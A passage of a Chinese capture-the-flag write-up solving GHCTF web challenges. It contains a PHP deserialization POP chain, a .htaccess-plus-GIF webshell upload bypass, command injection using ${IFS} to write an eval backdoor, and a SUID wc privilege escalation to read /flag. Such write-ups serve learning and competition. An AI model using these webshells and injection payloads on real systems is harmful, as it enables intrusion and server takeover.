&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;GHCTF&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>PHP反序列化，构造pop链</strong><br>介绍一下出现的魔法函数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__construct 类的构造函数，在类实例化对象时自动调用构造函数</span><br><span class="line">__destruct  类的析构函数，在对象销毁之前自动调用析构函数</span><br><span class="line">__toString  当使用<span class="keyword">echo</span>或<span class="keyword">print</span>输出对象将对象转化为字符串形式时，会调用<span class="title function_ invoke__">__toString</span>()方法</span><br><span class="line">__get   当访问一个对象的不存在或不可访问的属性时自动调用，传递属性名作为参数</span><br><span class="line">__call  调用不存在或不可见的成员方法时，PHP会先调用<span class="title function_ invoke__">__call</span>()方法来存储方法名及其参数</span><br><span class="line"><span class="title function_ invoke__">__set</span>(<span class="variable">$property</span>, <span class="variable">$value</span>)  当给一个对象的不存在或不可访问(<span class="keyword">private</span>修饰)的属性赋值时自动调用，传递属性名和属性值作为参数</span><br><span class="line">__invoke    当将一个对象作为函数进行调用时自动调用</span><br></pre></td></tr></table></figure><p>发现了<strong>原生类</strong>，<code>new $day2($day1)</code>，同时发现了<strong>遍历函数foreach()</strong>，直接借助<a href="https://www.anquanke.com/post/id/284901">DirectoryIterator类</a>进行<strong>目录遍历</strong>，然后就是<strong>SplFileObject类</strong>读取文件，其他能构造恶意代码的地方没找到</p><p>有了这个突破点，我们就可以逆回去，<strong>向上构造</strong>，看看哪个类可以触发<code>__get()</code>，发现<strong>Philosopher</strong>有个<strong>hey属性</strong>是<strong>不存在</strong>的，那么现在要触发的是<code>__invoke()</code>，一般找的都是<strong>return xxx();</strong>，有两个，就<code>CherryBlossom</code>吧</p><p>pop链为：<strong>CherryBlossom:<strong>destruct()-&gt;CherryBlossom::</strong>toString()-&gt;Philosopher::<strong>invoke()-&gt;Mystery::</strong>get()</strong></p><p><a href="https://www.cnblogs.com/-mo-/p/11582424.html">双重MD5绕过</a>，<strong>php弱比较</strong>中会截取字符串的数字，直至遇到字母截止，比如’11e33’，就会被读取为11，然后进行比较，改一下这个<code>py2</code>的脚本</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">CHARS = string.ascii_letters + string.digits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmp_md5</span>(<span class="params">substr, stop_event, str_len, start=<span class="number">0</span>, size=<span class="number">20</span></span>):</span><br><span class="line">    <span class="keyword">global</span> CHARS</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> stop_event.is_set():</span><br><span class="line">        rnds = <span class="string">&#x27;&#x27;</span>.join(random.choice(CHARS) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(size))</span><br><span class="line">        value1 = hashlib.md5(rnds.encode()).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> value1[start: start+str_len] == substr:</span><br><span class="line">            <span class="comment"># print(rnds)</span></span><br><span class="line">            <span class="comment"># stop_event.set()</span></span><br><span class="line">            <span class="comment"># 碰撞双md5</span></span><br><span class="line">            value2 = hashlib.md5(value1.encode()).hexdigest()</span><br><span class="line">            <span class="keyword">if</span> value2[start: start+str_len] == substr:</span><br><span class="line">                <span class="built_in">print</span>(rnds + <span class="string">&quot;=&gt;&quot;</span> + value1 + <span class="string">&quot;=&gt;&quot;</span> + value2 + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">                stop_event.<span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    substr = <span class="string">&#x27;666&#x27;</span></span><br><span class="line">    start_pos = <span class="number">0</span></span><br><span class="line">    str_len = <span class="built_in">len</span>(substr)</span><br><span class="line">    cpus = multiprocessing.cpu_count()</span><br><span class="line">    stop_event = multiprocessing.Event()</span><br><span class="line">    processes = [multiprocessing.Process(target=cmp_md5, args=(substr,</span><br><span class="line">                                         stop_event, str_len, start_pos))</span><br><span class="line">                 <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(cpus)]</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">        p.start()</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">        p.join()</span><br></pre></td></tr></table></figure><p>可以跑得一个，<strong>O7it1qaAgBbfAL9OVPyO</strong></p><p>至于怎么给<code>day1,day2</code>赋值，<a href="https://www.php.net/manual/zh/function.array-walk.php">官方文档</a>有提及的，涉及到回调处理，<code>day1</code>为值，<code>day2</code>为键</p><p>为了减少代码，其实可以只保留需要的属性即可，效果是一样的，而且出题人居然塞了这么多无用的类进来，晕</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CherryBlossom</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mystery</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Philosopher</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit10</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fruit11</span> = <span class="string">&quot;O7it1qaAgBbfAL9OVPyO&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">CherryBlossom</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;fruit1 = <span class="keyword">new</span> <span class="title class_">CherryBlossom</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;fruit1-&gt;fruit2 = <span class="keyword">new</span> <span class="title class_">Philosopher</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;fruit1-&gt;fruit2-&gt;fruit10 = <span class="keyword">new</span> <span class="title class_">Mystery</span>();</span><br><span class="line"><span class="comment"># $a-&gt;fruit1-&gt;fruit2-&gt;fruit10-&gt;DirectoryIterator = &quot;glob:///*&quot;;</span></span><br><span class="line"><span class="variable">$a</span>-&gt;fruit1-&gt;fruit2-&gt;fruit10-&gt;<span class="built_in">SplFileObject</span> = <span class="string">&quot;/flag44545615441084&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><h2 id="UPUPUP"><a href="#UPUPUP" class="headerlink" title="UPUPUP"></a>UPUPUP</h2><p>尝试了一下，题目对文件后缀和文件内容进行了过滤，然后上传一张<code>gif</code>的时候发现，<code>GIF89a</code>可以绕过检测</p><p>然后我们也可以知道题目用的是<strong>Apache服务器</strong>，再上传一个<code>.htaccess</code>使其按<strong>PHP文件解析</strong></p><p>然后试多几次发现<strong>不限制尺寸</strong>是无法上传的，参考<a href="https://www.anquanke.com/post/id/241147#h2-19">博客</a></p><p><code>.htaccess</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#define width 1337</span></span><br><span class="line"><span class="comment">#define height 1337</span></span><br><span class="line">&lt;FilesMatch <span class="string">&quot;.gif&quot;</span>&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p><code>shell.gif</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问<code>/images/shell.gif?1=system(&quot;cat /flag&quot;);</code></p><h2 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ConfigLoader</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config = [</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">            <span class="string">&#x27;mode&#x27;</span> =&gt; <span class="string">&#x27;production&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;log_level&#x27;</span> =&gt; <span class="string">&#x27;info&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;max_input_length&#x27;</span> =&gt; <span class="number">100</span>,</span><br><span class="line">            <span class="string">&#x27;min_password_length&#x27;</span> =&gt; <span class="number">8</span>,</span><br><span class="line">            <span class="string">&#x27;allowed_actions&#x27;</span> =&gt; [<span class="string">&#x27;run&#x27;</span>, <span class="string">&#x27;debug&#x27;</span>, <span class="string">&#x27;generate&#x27;</span>]</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;config[<span class="variable">$key</span>] ?? <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Logger</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$logLevel</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$logLevel</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;logLevel = <span class="variable">$logLevel</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"><span class="variable">$message</span>, <span class="variable">$level</span> = <span class="string">&#x27;info&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$level</span> === <span class="variable language_">$this</span>-&gt;logLevel) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;[LOG] <span class="subst">$message</span>\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserManager</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$users</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$logger</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$logger</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;logger = <span class="variable">$logger</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addUser</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>) &lt; <span class="number">5</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Username must be at least 5 characters&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>) &lt; <span class="number">8</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Password must be at least 8 characters&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;users[<span class="variable">$username</span>] = <span class="title function_ invoke__">password_hash</span>(<span class="variable">$password</span>, PASSWORD_BCRYPT);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;logger-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;User <span class="subst">$username</span> added&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User <span class="subst">$username</span> added&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">authenticate</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;users[<span class="variable">$username</span>]) &amp;&amp; <span class="title function_ invoke__">password_verify</span>(<span class="variable">$password</span>, <span class="variable">$this</span>-&gt;users[<span class="variable">$username</span>])) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;logger-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;User <span class="subst">$username</span> authenticated&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;User <span class="subst">$username</span> authenticated&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Authentication failed&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StringUtils</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitize</span>(<span class="params"><span class="variable">$input</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$input</span>, ENT_QUOTES, <span class="string">&#x27;UTF-8&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">generateRandomString</span>(<span class="params"><span class="variable">$length</span> = <span class="number">10</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">str_shuffle</span>(<span class="title function_ invoke__">str_repeat</span>(<span class="variable">$x</span> = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>, <span class="title function_ invoke__">ceil</span>(<span class="variable">$length</span> / <span class="title function_ invoke__">strlen</span>(<span class="variable">$x</span>)))), <span class="number">1</span>, <span class="variable">$length</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">InputValidator</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$maxLength</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$maxLength</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;maxLength = <span class="variable">$maxLength</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">validate</span>(<span class="params"><span class="variable">$input</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$input</span>) &gt; <span class="variable language_">$this</span>-&gt;maxLength) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Input exceeds maximum length of <span class="subst">&#123;$this-&gt;maxLength&#125;</span> characters&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CommandExecutor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$logger</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$logger</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;logger = <span class="variable">$logger</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"><span class="variable">$input</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$input</span>, <span class="string">&#x27; &#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;logger-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;Invalid input: space detected&quot;</span>);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;No spaces allowed&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @<span class="title function_ invoke__">exec</span>(<span class="variable">$input</span>, <span class="variable">$output</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;logger-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;Result: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">implode</span>(<span class="string">&quot;\n&quot;</span>, <span class="variable">$output</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ActionHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$config</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$logger</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$executor</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$config</span>, <span class="variable">$logger</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config = <span class="variable">$config</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;logger = <span class="variable">$logger</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;executor = <span class="keyword">new</span> <span class="title class_">CommandExecutor</span>(<span class="variable">$logger</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params"><span class="variable">$action</span>, <span class="variable">$input</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$action</span>, <span class="variable">$this</span>-&gt;config-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;allowed_actions&#x27;</span>))) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Invalid action&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;run&#x27;</span>) &#123;</span><br><span class="line">            <span class="variable">$validator</span> = <span class="keyword">new</span> <span class="title class_">InputValidator</span>(<span class="variable language_">$this</span>-&gt;config-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;max_input_length&#x27;</span>));</span><br><span class="line">            <span class="variable">$validationResult</span> = <span class="variable">$validator</span>-&gt;<span class="title function_ invoke__">validate</span>(<span class="variable">$input</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$validationResult</span> !== <span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$validationResult</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;executor-&gt;<span class="title function_ invoke__">execute</span>(<span class="variable">$input</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="variable">$action</span> === <span class="string">&#x27;debug&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Debug mode enabled&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="variable">$action</span> === <span class="string">&#x27;generate&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Random string: &quot;</span> . <span class="title class_">StringUtils</span>::<span class="title function_ invoke__">generateRandomString</span>(<span class="number">15</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Unknown action&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;action&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$config</span> = <span class="keyword">new</span> <span class="title class_">ConfigLoader</span>();</span><br><span class="line">    <span class="variable">$logger</span> = <span class="keyword">new</span> <span class="title class_">Logger</span>(<span class="variable">$config</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;log_level&#x27;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$actionHandler</span> = <span class="keyword">new</span> <span class="title class_">ActionHandler</span>(<span class="variable">$config</span>, <span class="variable">$logger</span>);</span><br><span class="line">    <span class="variable">$input</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;input&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$actionHandler</span>-&gt;<span class="title function_ invoke__">handle</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;action&#x27;</span>], <span class="variable">$input</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$config</span> = <span class="keyword">new</span> <span class="title class_">ConfigLoader</span>();</span><br><span class="line">    <span class="variable">$logger</span> = <span class="keyword">new</span> <span class="title class_">Logger</span>(<span class="variable">$config</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;log_level&#x27;</span>));</span><br><span class="line">    <span class="variable">$userManager</span> = <span class="keyword">new</span> <span class="title class_">UserManager</span>(<span class="variable">$logger</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;register&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$userManager</span>-&gt;<span class="title function_ invoke__">addUser</span>(<span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$userManager</span>-&gt;<span class="title function_ invoke__">authenticate</span>(<span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$logger</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;No action provided, running default logic&quot;</span>);</span><br><span class="line">&#125; [LOG] No action provided, running <span class="keyword">default</span> logic</span><br></pre></td></tr></table></figure><p>可以很快地找到<strong>关键代码</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CommandExecutor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$logger</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$logger</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;logger = <span class="variable">$logger</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"><span class="variable">$input</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$input</span>, <span class="string">&#x27; &#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;logger-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;Invalid input: space detected&quot;</span>);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;No spaces allowed&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @<span class="title function_ invoke__">exec</span>(<span class="variable">$input</span>, <span class="variable">$output</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;logger-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;Result: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">implode</span>(<span class="string">&quot;\n&quot;</span>, <span class="variable">$output</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后，触发点在</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;run&#x27;</span>) &#123;</span><br><span class="line">            <span class="variable">$validator</span> = <span class="keyword">new</span> <span class="title class_">InputValidator</span>(<span class="variable language_">$this</span>-&gt;config-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;max_input_length&#x27;</span>));</span><br><span class="line">            <span class="variable">$validationResult</span> = <span class="variable">$validator</span>-&gt;<span class="title function_ invoke__">validate</span>(<span class="variable">$input</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$validationResult</span> !== <span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$validationResult</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;executor-&gt;<span class="title function_ invoke__">execute</span>(<span class="variable">$input</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>除了<code>input</code>参数不能出现空格，貌似没什么其他需要注意的地方了，直接<code>/?action=run&amp;input=ls$&#123;IFS&#125;/</code></p><p><code>cat$&#123;IFS&#125;/flag</code>，读不出东西，其他都可以读，也没什么特殊报错，<code>[LOG] Result: cat$&#123;IFS&#125;/flag</code></p><p>这个时候就要考虑<strong>SUID提权</strong>了，先写入<strong>后门</strong>，<code>echo$&#123;IFS&#125;&#39;&lt;?=eval($_POST[1]);?&gt;&#39;$&#123;IFS&#125;&gt;shell.php</code>，只能说很奇葩，<strong>双引号</strong>有问题，然后我弄<code>base64</code>的话也是有点问题，最后选择了无标签的，还能省空格</p><p>然后拿蚁剑连上，右键打开<strong>虚拟终端</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line">/var/www/html/wc</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/su</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chsh</span><br></pre></td></tr></table></figure><p>只有<strong>wc</strong>能试试了，去搜了一下真有，<a href="https://gtfobins.github.io/gtfobins/wc/#file-read">wc提权</a></p><p><code>./wc --files0-from &quot;/flag&quot;</code></p><h2 id="Escape"><a href="#Escape" class="headerlink" title="Escape!"></a>Escape!</h2><p>大致功能就是注册、登录、写文件</p><p><code>waf.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$c</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$lists</span>=[<span 